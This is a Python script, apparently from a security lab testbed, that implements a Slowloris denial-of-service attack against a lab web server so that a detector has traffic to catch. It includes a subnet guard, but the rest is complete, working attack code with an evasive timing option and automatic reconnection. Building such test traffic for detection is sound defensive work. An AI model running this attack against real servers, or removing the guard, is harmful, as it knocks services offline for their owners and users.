#!/usr/bin/env python3
"""
Lab-only Slowloris generator for the SE-401 containment testbed.

SAFETY: this script hard-refuses to run against anything but the private lab
subnet (172.28.0.0/16) or an explicit localhost target. It exists so the
detector has a realistic low-and-slow signature to catch; it is NOT a tool for
use against systems you do not own.

Mechanism: open N sockets, send a partial HTTP header, then keep each socket
alive by trickling one more header line every `interval` seconds, never sending
the terminating blank line. This holds worker threads open on the victim.
"""
import argparse
import ipaddress
import random
import socket
import sys
import time

ALLOWED_NETS = [ipaddress.ip_network("172.28.0.0/16"),
                ipaddress.ip_network("127.0.0.0/8")]


def guard(target: str) -> str:
    """Resolve target and refuse anything outside the isolated lab."""
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(target))
    except OSError as e:
        sys.exit(f"[attacker] cannot resolve {target!r}: {e}")
    if not any(ip in net for net in ALLOWED_NETS):
        sys.exit(f"[attacker] REFUSING: {ip} is outside the lab subnet. "
                 "This tool only runs against the self-hosted victim.")
    return str(ip)


def open_socket(ip, port, jitter):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    # Incomplete request line + first header, no terminating CRLFCRLF.
    s.send(f"GET /?{random.randint(0, 1<<20)} HTTP/1.1\r\n".encode())
    s.send(f"Host: victim\r\n".encode())
    s.send(f"User-Agent: Mozilla/5.0 (lab-{random.randint(0,9999)})\r\n".encode())
    return s


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="victim")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--sockets", type=int, default=200)
    ap.add_argument("--interval", type=float, default=12.0,
                    help="seconds between keep-alive header trickles")
    ap.add_argument("--jitter", type=float, default=0.0,
                    help="randomise interval +/- this many seconds (evasive variant)")
    ap.add_argument("--duration", type=float, default=120.0)
    args = ap.parse_args()

    ip = guard(args.target)
    print(f"[attacker] lab target {args.target} ({ip}:{args.port}), "
          f"{args.sockets} sockets, interval {args.interval}s", flush=True)

    deadline = time.time() + args.duration
    conns = []
    for _ in range(args.sockets):
        try:
            conns.append(open_socket(ip, args.port, args.jitter))
        except OSError:
            pass
    print(f"[attacker] opened {len(conns)} sockets", flush=True)

    while time.time() < deadline:
        sleep = args.interval + random.uniform(-args.jitter, args.jitter)
        time.sleep(max(0.5, sleep))
        alive = []
        for s in conns:
            try:
                s.send(f"X-a: {random.randint(0,99999)}\r\n".encode())
                alive.append(s)
            except OSError:
                # reconnect dropped sockets to sustain pressure
                try:
                    alive.append(open_socket(ip, args.port, args.jitter))
                except OSError:
                    pass
        conns = alive
        print(f"[attacker] {len(conns)} sockets held, "
              f"{deadline - time.time():.0f}s left", flush=True)

    for s in conns:
        s.close()
    print("[attacker] done", flush=True)


if __name__ == "__main__":
    main()
